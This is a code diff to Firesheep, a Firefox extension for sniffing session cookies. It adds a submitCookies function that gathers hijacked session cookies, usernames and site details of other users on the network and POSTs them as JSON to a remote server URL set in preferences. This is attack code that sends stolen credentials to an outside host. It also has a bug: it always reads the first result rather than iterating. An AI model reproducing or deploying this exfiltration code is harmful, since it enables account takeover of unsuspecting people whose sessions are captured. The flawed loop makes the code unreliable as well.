@@ -162,6 +162,59 @@ function addResult (result) {
   list.appendChild(item);
 }
  
+
+function submitCookies()
+{	
+    var cookies = new Array();   
+    for(var resultId in Firesheep.results)
+    {
+	    var result = Firesheep.results[0];
+
+        cookie = {};
+        cookie.siteName = result.siteName;
+        cookie.siteUrl = result.siteUrl;
+        cookie.userAvatar = result.userAvatar;
+        cookie.userName = result.userName;
+        cookie.domains = new Array();
+
+        cookie.cookies = new Array();
+
+	    var acceptableCookieNames = result.handler.sessionCookieNames;
+        for (var cookieName in result.firstPacket.cookies)
+	    {
+            var found = false;
+            for(var i = 0; i < acceptableCookieNames.length; i++)
+	        {
+	        	if(cookieName == acceptableCookieNames[i])
+		            found = true;
+	        }
+            if(found)
+	            cookie.cookies.push( { cookieName : cookieName, cookieValue : result.firstPacket.cookies[cookieName] } );
+    	}
+        cookies.push(cookie);
+    }
+    var cookiesJson = "cookies=" + JSON.stringify(cookies);
+
+    var serverUrl = Cc["@mozilla.org/preferences-service;1"].getService(Ci.nsIPrefBranch).getCharPref('firesheep.server_submit_url');
+    if(serverUrl != "" && serverUrl != null)
+    {
+        var xmlhttp=new XMLHttpRequest();
+        xmlhttp.open("POST",serverUrl,true);
+        xmlhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+        xmlhttp.setRequestHeader("Content-length", cookiesJson.length);
+        xmlhttp.setRequestHeader("Connection", "close");
+        xmlhttp.onreadystatechange = function() {
+	        if(xmlhttp.readyState == 4 && xmlhttp.status == 200) {
+        		alert(xmlhttp.responseText);
+        	}
+        }
+        xmlhttp.send(cookiesJson);
+    }
+    else
+        alert("Please set the server url in preferences.");
+}   
+
+
 function onResultDoubleClick () {
   try {
     var resultsList = document.getElementById('resultsList');
